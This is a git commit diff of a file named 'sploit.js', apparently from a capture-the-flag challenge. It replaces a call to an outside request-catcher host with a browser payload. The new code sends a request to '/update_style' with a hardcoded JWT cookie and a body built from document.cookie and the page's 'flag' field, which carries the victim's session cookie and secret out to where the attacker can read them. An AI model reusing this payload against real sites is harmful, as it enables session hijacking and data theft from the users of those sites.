1cafcf3da856197417f4756e4eaf39247de58d3b
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-03-05 17:57:51 +0200

    Update sploit.js

--- sploit.js
+++ sploit.js
@@ -1,1 +1,7 @@
-fetch('https://ll.requestcatcher.com/');
+fetch("/update_style", {
+  "headers":{
+    "Cookie":"authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiZXhwIjoxNjc4MDMzMDczfQ.13hv8QmtQt6vM8QwzeQpJIjxz8-N3TBw6wjTuPMOU_o"
+  },
+  "body": "style="+document.cookie+" -- "+document.getElementById('flag').value.toString(),
+
+});
